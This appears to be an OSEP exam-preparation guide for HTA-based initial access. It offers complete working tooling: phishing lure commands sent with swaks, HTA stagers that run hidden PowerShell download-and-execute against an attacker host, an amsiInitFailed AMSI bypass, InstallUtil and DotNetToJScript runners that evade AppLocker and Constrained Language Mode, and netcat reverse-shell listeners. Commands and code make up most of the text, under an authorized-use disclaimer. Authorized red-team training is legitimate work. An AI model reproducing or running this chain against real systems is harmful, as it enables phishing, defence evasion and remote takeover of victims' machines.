::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# HTA entry

If mail will open a link or `.hta` but Office macros are unavailable, this is usually the next-fastest initial-access path. Keep stage one short — trigger, fetch, hand off. Name the failure before you rewrite the payload: HTA never ran vs HTA ran but the next stage was blocked.

## Mail entry, no Office macros

If the target will open an HTA and AppLocker blocks a standalone EXE, use `mshta` as the host — don't land and launch an uploaded EXE.

- [ ] Start the static server and listener
- [ ] Prove HTA fires with the callback (`m02-hta-callback.hta`)
- [ ] If there is no CLM, deliver the PowerShell stager (`m02-hta-powershell-stager.hta` → `shell.ps1`)
- [ ] If CLM is on or `powershell.exe` is denied, switch to the combined chain below — don't keep trying IEX variants here

Start the server and listener:

```bash
mkdir -p ~/osep/payloads/web && cd ~/osep/payloads/web
cp <this-project>/m02-hta-callback.hta ./ok.hta
cp <this-project>/m02-hta-powershell-stager.hta ./stager.hta
printf 'ok' > ok.txt          # for callback probe
python3 -m http.server 80     # or 8080; put the full URL in the mail
nc -lvnp LPORT                # stage-2 reverse listener
```

Pre-prepare stage-2 `shell.ps1` (stable TCP reverse; usable as-is when there is no CLM). Replace `[ATTACKER_IP]`/`[PORT]` with `LHOST`/`LPORT` and place it at the web root. Pre-compile **both x86 and x64** InstallUtil-compatible runners (`m02-clm-bypass-runspace.cs`) as a fallback — see the combined-chain compile commands below.

Mail a link (prefer a URL over an attachment — attachments are often filtered):

```bash
# Send a "link" lure (recommended): HTA at web root; body only gives http://LHOST/stager.hta
swaks --body 'Please click here http://LHOST/stager.hta' \
  --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" \
  --header "Subject: Invoice issue" -t TARGET -f USER@LHOST_DOMAIN \
  --server SMTP_SERVER
# Attachment form (may be filtered; backup only):
sendEmail -s SMTP_SERVER -t TARGET -f sender@example.com \
  -u "Subject: issue" -m "see attached" -a ~/osep/payloads/web/stager.hta
```

A `GET /ok.hta` and `GET /cb` in the server log means mshta → JScript → ActiveX is fully open. Then `stager.hta` has `WScript.Shell.Run` start `powershell.exe -nop -w hidden -Command "IEX(DownloadString 'http://LHOST/shell.ps1')"`. Watch for `GET /stager.hta`, `GET /shell.ps1`, and an `nc` callback.

In-session, decide whether to leave this path:

```powershell
$ExecutionContext.SessionState.LanguageMode            # ConstrainedLanguage = CLM
Get-AppLockerPolicy -Effective                          # effective rules
Get-Process -Name powershell | % { $_.Modules | ? ModuleName -eq 'amsi.dll' }
```

If LanguageMode is `ConstrainedLanguage` or `powershell.exe` is denied by AppLocker, switch immediately to the combined chain — don't keep trying IEX variants here. If only EXEs are blocked and PowerShell is available, HTA can still drop a file and load it with `InstallUtil.exe /U` (InstallUtil under `%SystemRoot%`, allowed by default rules). Runner: `m02-clm-bypass-runspace.cs`.

On x64, `C:\Windows\System32\mshta.exe` is 64-bit and pulls 64-bit PowerShell; for an x86 payload use `C:\Windows\SysWOW64\mshta.exe`, or call `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` explicitly.

If there is no `GET /xxx.hta`, delivery failed — the mail never opened, or the attachment was filtered; send only a link, or a shortcut that runs `C:\Windows\System32\mshta.exe http://LHOST/stager.hta`. If there is a GET for the HTA but no `/cb`, JScript inside mshta never ran. If `mshta.exe` itself is denied by AppLocker, switch to `cscript`/`wscript` JScript (module 03), or another signed host allowed by default. If `DownloadString` is blocked, handle AMSI first or jump straight to the combined chain. If egress is proxy-only, set `[System.Net.WebRequest]::DefaultWebProxy` inside `shell.ps1` (module 09).

HTA flashes a desktop window — `<HTA:APPLICATION ... WINDOWSTATE="minimize">` and `window.close()` at the end keep it from sitting in front of the user. Run the harmless callback before any payload so you don't burn a whole mail round on a dead entry.

::: details `m02-hta-callback.hta` · click to expand

````html
<!--
Purpose: Minimal HTA callback — confirm JScript hosted by mshta can run and egress
      (harmless; drops no payload)
Scenario: 6 / 7 / 8 (first validation step for any HTA chain)
Dependencies: target mshta.exe (built-in); attacker HTTP (python3 -m http.server 80)
Usage: replace LHOST with attacker IP, place at web root; target opens
      http://LHOST/m02-hta-callback.hta
      Attacker: log shows GET /m02-hta-callback.hta and GET /cb?u=... = success
Placeholders: LHOST=attacker-reachable IP; callback path fixed at /cb
Test status: Not Windows-lab tested (this host is macOS); JScript syntax hand-reviewed
-->
<html>
<head>
<title>Loading</title>
<HTA:APPLICATION ID="m02cb" APPLICATIONNAME="m02cb"
  SCROLL="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
<script language="JScript">
    // Stage marker: fire once as soon as mshta starts this script
    function beacon(path) {
        try {
            var x = new ActiveXObject("MSXML2.XMLHTTP");
            x.open("GET", "http://LHOST" + path, false); // false = wait synchronously
            x.send();
        } catch (e) { /* even if egress fails, finish the script so logs can be compared */ }
    }
    beacon("/cb?stage=hta-start");

    var sh = new ActiveXObject("WScript.Shell");

    // 1) Report identity (user@host) — proves ActiveX works
    var who = sh.ExpandEnvironmentStrings("%USERNAME%") + "@" +
              sh.ExpandEnvironmentStrings("%COMPUTERNAME%");
    beacon("/cb?u=" + encodeURIComponent(who));

    // 2) Harmless egress probe: request ok.txt (any text); do not execute its content
    //    sh.Run("powershell.exe -nop -w hidden -Command \"(New-Object Net.WebClient).DownloadString('http://LHOST/ok.txt')\"", 0, true);

    // Note: only after all three echoes (hta-start / u= / optional ok.txt GET) appear
    // should you swap the entry to a real stager; if any is missing, fix that link first —
    // do not jump straight to a payload.
</script>
</head>
<body>
<script language="JScript">window.close();</script>
</body>
</html>
````

:::

::: details `m02-hta-powershell-stager.hta` · click to expand

````html
<!--
Purpose: HTA→PowerShell pull-and-run stage 2 (shell.ps1); scenario 6 main entry;
      scenario 8 "merged shape" control
Scenario: 6 (no Office, no CLM); 8 (control: IEX download content in one command)
Dependencies: target mshta.exe + powershell.exe (AppLocker default rules allow System32);
      attacker HTTP and listener
Usage: replace LHOST/LPORT, place at web root; put shell.ps1 (TCP reverse) on the same
      server; target opens http://LHOST/m02-hta-powershell-stager.hta or
      mshta.exe http://LHOST/xxx.hta
Placeholders: LHOST=attacker IP; LPORT=reverse listen port (used inside shell.ps1);
      URL=stage-2 script address
Test status: Not Windows-lab tested (this host is macOS); quote-nesting rules in comments
      below — retest after edits
-->
<html>
<head>
<title>Loading</title>
<HTA:APPLICATION ID="m02st" APPLICATIONNAME="m02st"
  SCROLL="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
<script language="JScript">
    // Echo point: helps confirm mshta actually reached here
    function beacon(path) {
        try {
            var x = new ActiveXObject("MSXML2.XMLHTTP");
            x.open("GET", "http://LHOST" + path, false);
            x.send();
        } catch (e) {}
    }
    beacon("/cb?stage=hta-start");

    var sh = new ActiveXObject("WScript.Shell");

    // Stage-2 script URL: use the URL placeholder; replace before use
    // For a single "download and execute" PowerShell command, use:
    //   IEX((New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1'))
    // If the target egresses via proxy, set the proxy inside the command before IEX
    // (see M09 scenario 28).
    var url = "http://LHOST/shell.ps1";

    // Quote rules (most common HTA breakpoint):
    // Outer Run(...) wraps the whole command line in single quotes; parameters
    // inside use double quotes; strings inside PowerShell use single quotes, so
    // you need \' escapes (demonstrated on this line).
    // If edits break, safest path: Base64-encode the whole PowerShell block and
    // pass with -enc so the command string has only one quote layer
    // (see header examples in m02-hta-download-exec-split.hta).
    var cmd = "powershell.exe -nop -w hidden -Command " +
              "\"IEX((New-Object Net.WebClient).DownloadString('" + url + "'))\"";

    // 0=hidden window, true=wait for process exit before returning
    var rc = sh.Run(cmd, 0, true);
    if (rc !== 0) { beacon("/cb?stage=iex-fail&rc=" + rc); }
    else          { beacon("/cb?stage=iex-done"); }
</script>
</head>
<body>
<script language="JScript">window.close();</script>
</body>
</html>
````

:::

::: details `m02-clm-bypass-runspace.cs` · click to expand

````csharp
// Purpose: InstallUtil-compatible runner — InstallUtil.exe /U triggers Uninstall(),
//       which in a custom Runspace (FullLanguage) does AMSI handling then IEX-
//       downloads stage-2 shell.ps1 (bypass AppLocker EXE direct-launch limits + CLM)
// Scenario: 6 (EXE denied by AppLocker, PowerShell available — fallback) /
//       7 (AppLocker+CLM+AMSI combined-chain core)
// Dependencies: Windows + .NET Framework 4 + System.Management.Automation (GAC,
//       ships with PowerShell); compile with csc
// Usage: compile on a Windows build host (x64 and x86 each):
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /out:m02stage64.exe ^
//     /r:System.Management.Automation.dll /r:System.Configuration.Install.dll m02-clm-bypass-runspace.cs
//   (32-bit uses Framework\v4.0.30319; if /r by simple name fails, give the full
//    GAC path: C:\Windows\assembly\GAC_MSIL\System.Management.Automation\<ver>__31bf3856ad364e35\...)
//   Place artifact at Kali web root; on the target:
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U <exe>
//   Note: InstallUtil only runs Uninstall(); Main() is never executed
// Placeholders: LHOST=attacker IP (replace DEFAULT_URL below); LPORT is inside
//       shell.ps1; env var M02_URL can override the URL
// Test status: Not lab-tested (this host is macOS, no csc); compile on Windows
//       and verify the full chain on the lab net
using System;
using System.Collections;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace M02
{
    class Program
    {
        static void Main(string[] args)
        {
            // When run directly, only print usage; real entry is Installer.Uninstall below (InstallUtil /U)
            Console.WriteLine("m02-clm-bypass-runspace: run via InstallUtil.exe /U <this.exe>");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Stage : System.Configuration.Install.Installer
    {
        private const string DEFAULT_URL = "http://LHOST/shell.ps1";

        public override void Uninstall(IDictionary savedState)
        {
            // Allow env override of URL so you need not recompile to change address:
            //   target: set M02_URL=http://LHOST/shell.ps1 && InstallUtil.exe /U ...
            string url = Environment.GetEnvironmentVariable("M02_URL");
            if (string.IsNullOrEmpty(url)) { url = DEFAULT_URL; }

            // Key point: CLM is a language-mode limit inside the powershell.exe process engine;
            // this process is InstallUtil — a self-built Runspace starts in FullLanguage.
            using (Runspace rs = RunspaceFactory.CreateRunspace())
            {
                rs.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;

                // 1) AMSI handling: AMSI is attached to the System.Management.Automation
                //    engine regardless of who created the process, so set amsiInitFailed
                //    in the same engine before running downloaded content (FullLanguage
                //    allows reflection).
                // 2) Download and run stage 2 (shell.ps1 has TCP reverse; replace LHOST/LPORT first).
                string script =
                    "$f=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')" +
                    ".GetField('amsiInitFailed','NonPublic,Static');" +
                    "if($f){$f.SetValue($null,$true)};" +
                    "IEX((New-Object Net.WebClient).DownloadString('" + url + "'));";

                ps.AddScript(script);
                try { ps.Invoke(); }
                catch (Exception ex)
                {
                    // Fail with readable output: InstallUtil /LogToConsole=false does not log to disk; errors go to stderr
                    Console.Error.WriteLine("[m02] runspace invoke failed: " + ex.Message);
                }
                rs.Close();
            }
        }
    }
}
````

:::


## AppLocker, CLM, and AMSI together

If HTA runs but AppLocker, CLM, and AMSI are all on, a component working alone is not enough — walk the full chain end-to-end.

- [ ] Recon that all three are present (`m00-recon-defenses.ps1`)
- [ ] Confirm mshta itself is not blocked (`m02-hta-callback.hta` → `GET /cb`)
- [ ] Host an improved `shell.ps1` with AMSI handling on the first line, then the reverse
- [ ] Compile both x64 and x86 runners, or use the single-file embedded HTA (on-target `csc` + `InstallUtil /U`)
- [ ] Watch the echo points and the `nc` callback

Compile the runners on a Windows build host:

```bat
:: x64 (preferred on 64-bit targets)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo ^
  /out:%USERPROFILE%\m02stage64.exe ^
  /r:System.Management.Automation.dll /r:System.Configuration.Install.dll ^
  m02-clm-bypass-runspace.cs
:: x86 (backup)
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /nologo ^
  /out:%USERPROFILE%\m02stage32.exe ^
  /r:System.Management.Automation.dll /r:System.Configuration.Install.dll ^
  m02-clm-bypass-runspace.cs
```

If `/r:System.Management.Automation.dll` fails to resolve, reference the full GAC path: `C:\Windows\assembly\GAC_MSIL\System.Management.Automation\<ver>__31bf3856ad364e35\System.Management.Automation.dll`. Also add a `System.Configuration.Install` reference. Optional: `certutil -encode m02stage64.exe enc.txt` so the runner can travel as text (decode on target with `certutil -decode`). Place exe/enc.txt and `shell.ps1` at the web root; start `python3 -m http.server` and `nc -lvnp LPORT`.

Trigger the single-file chain (embedded C# + on-target csc + InstallUtil /U), or run the equivalent download → decode → InstallUtil steps by hand:

```
mshta.exe http://LHOST/m02-hta-embedded-clm-bypass.hta
```

In-chain: write `m02stage.cs` to `C:\Windows\Tasks\` (or `%TEMP%`) → `csc.exe` builds `m02stage.exe` (Framework64/Framework by process bitness) → `InstallUtil.exe /logfile= /LogToConsole=false /U <exe>` triggers `Installer.Uninstall()` → a custom Runspace does AMSI handling, then `IEX(DownloadString 'http://LHOST/shell.ps1')` → `shell.ps1` reverses to `LHOST:LPORT`. Echo points: `hta-start` / `cs-written` / `compile-ok` / `installutil-done` / final `nc` callback.

Why this clears all three gates: mshta/csc/InstallUtil are signed System32 programs, so direct launch is allowed, and the runner is an assembly loaded by InstallUtil — EXE rules do not apply. CLM only applies to the engine inside `powershell.exe`; a self-built Runspace inside InstallUtil is FullLanguage. AMSI still attaches to that engine, so run `amsiInitFailed` reflection in the **same** Runspace before IEX.

The same runner can also be triggered without mshta:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe \
  /logfile= /LogToConsole=false /U C:\Windows\Tasks\m02stage64.exe
```

If InstallUtil itself is denied, use the DotNetToJScript variant: compile `m02-clm-bypass-dotnettojscript.cs` as a library, serialize to `.js` with DotNetToJScript, and embed in the HTA (module 03) — no EXE and no InstallUtil.

If the chain stops before compile, write or `csc` is blocked. If it stops after InstallUtil with no callback, runner bitness is wrong or `shell.ps1` is blocked by AMSI/AV — swap the other build, and confirm actual mshta/InstallUtil bitness (Framework64 is 64-bit). If the AMSI-handling line itself is blocked (`AmsiUtils` is a signature), switch reflection styles or string-split concatenation (`m05-amsi-bypass-variants.ps1`). If each link works alone but the chain does nothing, triage timing in the next section — don't assume AV.

Walk this chain end-to-end on the lab net before the exam. Keep x64/x86 copies of the runner and `shell.ps1` and pick by the measured target. Prefer a simple TCP reverse + AMSI handling over a large Meterpreter payload. Minimize the HTA window and close it immediately.

::: details `m02-hta-embedded-clm-bypass.hta` · click to expand

````html
<!--
Purpose: Single-file full combined-chain HTA: mshta→(write C# source)→csc compile
      now→InstallUtil /U→custom Runspace→AMSI handling→IEX shell.ps1
Scenario: 7 (main path when AppLocker + CLM + AMSI are all on; no pre-built artifact required)
Dependencies: target mshta.exe / csc.exe / InstallUtil.exe (all under SystemRoot;
      AppLocker default rules allow)
Usage: replace LHOST in two places (JS constant cbHost and the shell.ps1 URL inside
      embedded C#), place at web root; target opens
      http://LHOST/m02-hta-embedded-clm-bypass.hta
Placeholders: LHOST=attacker IP; shell.ps1=stage-2 reverse at web root (replace
      LHOST/LPORT yourself first)
Test status: Not Windows-lab tested (this host is macOS); full lab-net verification
      required (scenario 7 demands combined validation)
Note: embedded C# matches m02-clm-bypass-runspace.cs logic; keep both in sync when editing
-->
<html>
<head>
<title>Loading</title>
<HTA:APPLICATION ID="m02clm" APPLICATIONNAME="m02clm"
  SCROLL="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
<script language="JScript">
    var cbHost = "http://LHOST";   // for echoes
    var psURL  = "http://LHOST/shell.ps1"; // stage 2 downloaded inside the runner

    function beacon(p) {
        try {
            var x = new ActiveXObject("MSXML2.XMLHTTP");
            x.open("GET", cbHost + p, false);
            x.send();
        } catch (e) {}
    }
    function fso() { return new ActiveXObject("Scripting.FileSystemObject"); }

    // Pick a writable dir: prefer C:\Windows\Tasks (AppLocker checks direct EXE launch,
    // not assemblies loaded by InstallUtil); fall back to %TEMP%
    function pickDir() {
        var sh = new ActiveXObject("WScript.Shell");
        var d = "C:\\Windows\\Tasks";
        try { fso().CreateFolder(d); } catch (e) {}
        try {
            var t = d + "\\.wtest";
            var f = fso().CreateTextFile(t, true); f.Close(); fso().DeleteFile(t);
            return d;
        } catch (e) { return sh.ExpandEnvironmentStrings("%TEMP%"); }
    }

    // Locate .NET Framework dir (by process bitness) and System.Management.Automation.dll in the GAC
    function fxDir() {
        var sh = new ActiveXObject("WScript.Shell");
        var arch = sh.Environment("PROCESS")("PROCESSOR_ARCHITECTURE");
        var pre = (arch === "x86") ? "Framework" : "Framework64";
        var d = "C:\\Windows\\Microsoft.NET\\" + pre + "\\v4.0.30319";
        if (!fso().FolderExists(d)) { d = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"; }
        return d;
    }
    function gacSmaDll() {
        var base = "C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\";
        if (!fso().FolderExists(base)) { return ""; }
        var e = new Enumerator(fso().GetFolder(base).SubFolders);
        for (; !e.atEnd(); e.moveNext()) {
            var p = base + e.item().Name + "\\System.Management.Automation.dll";
            if (fso().FileExists(p)) { return p; }
        }
        return "";
    }

    beacon("/cb?stage=hta-start");

    // ---- Embedded C# source (equivalent to m02-clm-bypass-runspace.cs, trimmed to embed) ----
    // Convention: each line is a JS double-quoted string; source itself avoids double
    // quotes and backslashes to prevent escape bugs.
    // To change URL: editing psURL also affects the line that concatenates it into C#.
    var csLines = [
        "using System;",
        "using System.Collections;",
        "using System.Management.Automation;",
        "using System.Management.Automation.Runspaces;",
        "using System.Configuration.Install;",
        "namespace M02 {",
        "  [System.ComponentModel.RunInstaller(true)]",
        "  public class S : System.Configuration.Install.Installer {",
        "    public override void Uninstall(IDictionary saved) {",
        "      string u = '" + psURL + "';",
        "      using (Runspace rs = RunspaceFactory.CreateRunspace()) {",
        "        rs.Open();",
        "        PowerShell ps = PowerShell.Create();",
        "        ps.Runspace = rs;",
        "        string sc = \"$f=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static');if($f){$f.SetValue($null,$true)};IEX((New-Object Net.WebClient).DownloadString(u));\";",
        "        ps.AddScript(sc);",
        "        ps.Invoke();",
        "        rs.Close();",
        "      }",
        "    }",
        "  }",
        "}"
    ];

    var dir = pickDir();
    var csPath = dir + "\\m02stage.cs";
    var exePath = dir + "\\m02stage.exe";
    try {
        var w = fso().CreateTextFile(csPath, true);
        for (var i = 0; i < csLines.length; i++) { w.WriteLine(csLines[i]); }
        w.Close();
        beacon("/cb?stage=cs-written&dir=" + dir);
    } catch (e) { beacon("/cb?stage=cs-write-fail"); }

    var fx = fxDir();
    var sma = gacSmaDll();
    var csc = fx + "\\csc.exe";
    // Without a GAC path, fall back to simple-name references (works in some envs) and leave a log trail
    var refs = (sma !== "") ? "/r:\"" + sma + "\" /r:\"" + fx + "\\System.Configuration.Install.dll\""
                            : "/r:System.Management.Automation.dll /r:System.Configuration.Install.dll";
    var cc = csc + " /nologo /out:\"" + exePath + "\" " + refs + " \"" + csPath + "\"";

    var sh = new ActiveXObject("WScript.Shell");
    var rc1 = sh.Run(cc, 0, true);
    if (rc1 !== 0) { beacon("/cb?stage=compile-fail&rc=" + rc1); }
    else if (!fso().FileExists(exePath)) { beacon("/cb?stage=compile-fail&reason=no-exe"); }
    else {
        beacon("/cb?stage=compile-ok");
        var iu = fx + "\\InstallUtil.exe";
        // /U triggers Installer.Uninstall() above: custom Runspace(FullLanguage) → AMSI handling → IEX(psURL)
        var cmd = iu + " /logfile= /LogToConsole=false /U \"" + exePath + "\"";
        var rc2 = sh.Run(cmd, 0, true);
        if (rc2 !== 0) { beacon("/cb?stage=installutil-fail&rc=" + rc2); }
        else           { beacon("/cb?stage=installutil-done"); }
    }
    // Conclusion: compile-fail = csc reference/path issue; installutil-done with no callback =
    // runner bitness or shell.ps1 blocked by AMSI.
    // Bitness: this HTA picks Framework/Framework64 from mshta bitness; on 64-bit targets
    // default mshta is 64-bit.
</script>
</head>
<body>
<script language="JScript">window.close();</script>
</body>
</html>
````

:::

::: details `m02-clm-bypass-dotnettojscript.cs` · click to expand

````csharp
// Purpose: C# payload skeleton for the DotNetToJScript path (CLM-bypass edition) —
//       JScript only loads; heavy work stays on the managed side
// Scenario: 7, 10 (HTA/JScript entry + CLM + AMSI combined)
// Dependencies: .NET Framework 4.x; csc.exe compile as Library
// Usage:
//   csc.exe /target:library /out:clm.dll m02-clm-bypass-dotnettojscript.cs
//   then convert with DotNetToJScript to .js, or host via m02-hta-embedded-clm-bypass.hta
// Placeholders: LHOST/LPORT, STAGE2_URL, XOR_KEY
// Test status: Not compile-verified (no csc on this host); syntax hand-checked
//
// Notes (scenario 7 full chain):
//   HTA(mshta) → JScript/COM instantiates this class → new Runspace(FullLanguage) → load stage 2
//   This class only "restores language capability under CLM"; concrete payload stays in
//   stage 2 so it can be swapped independently.

using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Payload
{
    [ComVisible(true)]
    public class ClmRunner
    {
        private const string STAGE2_URL = "http://LHOST/stage2.b64";  // ← replace
        private const byte XOR_KEY = 0x2A;

        public ClmRunner() { }

        public void Run()
        {
            try
            {
                byte[] enc = new WebClient().DownloadData(STAGE2_URL);
                for (int i = 0; i < enc.Length; i++) enc[i] ^= XOR_KEY;

                Assembly asm = Assembly.Load(enc);
                foreach (Type t in asm.GetTypes())
                {
                    if (!t.IsPublic) continue;
                    MethodInfo m = t.GetMethod("Run", BindingFlags.Public | BindingFlags.Static);
                    if (m != null) { m.Invoke(null, null); return; }
                }
            }
            catch (Exception ex)
            {
                // Do not fail silently: distinguish "download failed" vs "load/AMSI failed"
                Console.Error.WriteLine("[!] CLM runner failed: " + ex.Message);
            }
        }
    }
}
````

:::


## Download and execute together fail

If the HTA opened and the download URL was hit, but there is no callback, treat it as timing or lifecycle — don't assume AV first.

- [ ] Start the server, listener, and a `tail -f` on the web access log — every conclusion here comes from log order
- [ ] Answer the four log questions below
- [ ] Run the split HTA (`m02-hta-download-exec-split.hta`)
- [ ] Map the log to a cause, then fix that cause

Four questions, line by line in the web log:

1. Is there `GET /xxx.hta`? No → delivery/trigger problem, not the exec chain.
2. Is there the first-line echo (`/cb?stage=hta-start`)? No → JScript inside mshta never ran.
3. Is there `GET /shell.ps1`? No → the stage-1 command never reached download.
4. Is there a callback? No, but 1–3 all yes → the break is between download and execute.

The split HTA does `WScript.Shell.Run(downloadCmd, 0, true)` (`true` = wait for that process to exit), checks the file exists, echoes `download-done`, then `Run(execCmd, 0, true)` and echoes `exec-done`. A 2–5 second `window.setTimeout` between stages provides a diagnostic delay; it does not guarantee that a scanner has released the file. `WScript.Sleep` is unavailable in mshta (the `WScript.Shell` COM object is separate and still works).

If stage 1 fails, the download command quotes or proxy are wrong — try `certutil.exe -urlcache -split -f URL OUT` or `bitsadmin.exe /transfer`, or set an explicit PowerShell proxy. If stage 1 is OK and stage 2 fails, the exec path is limited (CLM/AppLocker/AV) — switch exec to InstallUtil /U or a custom Runspace IEX, and keep download split. If both stages succeed alone but one combined command fails, stop trying one-liners: stay two-stage, or put two `Run`s in one `.hta` with `start /wait` semantics each, and Base64 the PowerShell with `-enc` so the command has one quote layer.

Only when the logs show every stage succeeded, the split succeeds, and only the merge fails should AV/AMSI become a candidate — then retry with the combined-chain AMSI handling and shorter commands.

If you suspect a scan race, use a fixed `window.setTimeout` delay (2000–5000 ms) or poll until the file is readable, then exec. If `window.close()` / `self.close()` takes children with it, launch exec via `schtasks` or `wmic process call create` so it leaves the host process tree (check AppLocker allowlists). Prefer writing under `C:\Windows\Tasks` or `%TEMP%`.

::: details `m02-hta-download-exec-split.hta` · click to expand

````html
<!--
Purpose: Two-stage HTA with download and execute separated: stage 1 drops and
      checks the file exists; stage 2 only then executes; each stage has HTTP echoes
Scenario: 8 (main tool for "merged fails, split works" timing/lifecycle triage);
      also a stable landing shape for scenarios 6/7
Dependencies: target mshta.exe + powershell.exe (or certutil/bitsadmin downloaders
      as needed); attacker HTTP
Usage: replace LHOST, URL, OUT; place at web root; target opens
      http://LHOST/m02-hta-download-exec-split.hta
      Attacker watches the log: hta-start -> download-done/fail -> exec-done/fail
Placeholders: LHOST=attacker IP; URL=stage-2 file to download; OUT=drop path on
      target (default C:\Windows\Tasks)
Test status: Not Windows-lab tested (this host is macOS); JScript syntax hand-reviewed
-->
<html>
<head>
<title>Loading</title>
<HTA:APPLICATION ID="m02split" APPLICATIONNAME="m02split"
  SCROLL="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
<script language="JScript">
    var URL = "http://LHOST/shell.ps1";      // download source (stage-2 script)
    var OUT = "C:\\Windows\\Tasks\\stage2.ps1"; // drop path (Tasks is user-writable; or %TEMP%)
    var EXE = "";                            // if downloading an EXE for another exec path, put downloader args here

    function beacon(path) {
        try {
            var x = new ActiveXObject("MSXML2.XMLHTTP");
            x.open("GET", "http://LHOST" + path, false);
            x.send();
        } catch (e) {}
    }
    function fileExists(p) {
        try {
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            return fso.FileExists(p);
        } catch (e) { return false; }
    }
    function fileSize(p) {
        try {
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            return fso.GetFile(p).Size;
        } catch (e) { return -1; }
    }
    beacon("/cb?stage=hta-start");

    var sh = new ActiveXObject("WScript.Shell");

    // ---- Stage 1: download only, wait for it to finish ----
    // PowerShell version (default). If blocked, replace cmd below with:
    //   certutil.exe -urlcache -split -f URL OUT
    //   bitsadmin.exe /transfer m02 /download /priority normal URL OUT
    // Same quote rules: outer single quotes, parameter double quotes, PS string
    // single quotes escaped; if escaping is painful, use the certutil one-liner
    // (no inner quotes).
    var dl = "powershell.exe -nop -w hidden -Command " +
             "\"(New-Object Net.WebClient).DownloadFile('" + URL + "','" + OUT + "')\"";
    var rc1 = sh.Run(dl, 0, true);

    // HTA is not Windows Script Host: delay the continuation with a browser timer.
    // Keep the window alive until the continuation finishes.
    window.setTimeout(finishStages, 3000);

    function finishStages() {
        if (rc1 !== 0) {
            beacon("/cb?stage=download-fail&rc=" + rc1);
        } else if (!fileExists(OUT)) {
            beacon("/cb?stage=download-fail&reason=no-file");
        } else {
            beacon("/cb?stage=download-done&size=" + fileSize(OUT));
            // ---- Stage 2: only after the file is confirmed, execute separately ----
            // Choose exec by dropped file type:
            //  .ps1 -> powershell -File (needs no CLM/script-rule limits; if limited,
            //         switch to InstallUtil/Runspace)
            //  .exe -> Run directly or InstallUtil.exe /U (AppLocker case; see
            //         m02-hta-embedded-clm-bypass.hta)
            var ex = "powershell.exe -nop -w hidden -ExecutionPolicy Bypass -File " + "\"" + OUT + "\"";
            var rc2 = sh.Run(ex, 0, true);
            if (rc2 !== 0) { beacon("/cb?stage=exec-fail&rc=" + rc2); }
            else           { beacon("/cb?stage=exec-done"); }
        }
        window.close();
    }
    // Log conclusions: download-fail = download link issue (quotes/proxy/URL);
    //               download-done + exec-fail = exec path limited — switch to
    //               scenario 7 combined chain;
    //               both stages done but no callback = shell.ps1 content/listener
    //               (AMSI → scenario 7).
</script>
</head>
<body>
<!-- Closed by finishStages after the timer and stage checks complete. -->
</body>
</html>
````

:::


## Cheat sheet

| You want to… | Use |
|---|---|
| Prove mshta / JScript / egress | `m02-hta-callback.hta` |
| No CLM — IEX pull stage two | `m02-hta-powershell-stager.hta` + `shell.ps1` |
| AppLocker + CLM + AMSI all on | `m02-hta-embedded-clm-bypass.hta`, or pre-built `m02-clm-bypass-runspace.cs` + `InstallUtil /U` |
| InstallUtil itself denied | `m02-clm-bypass-dotnettojscript.cs` → DotNetToJScript (module 03) |
| Merged download+exec fails | `m02-hta-download-exec-split.hta` |
| Mail delivery | Link to `http://LHOST/stager.hta` (attachments are often filtered) |
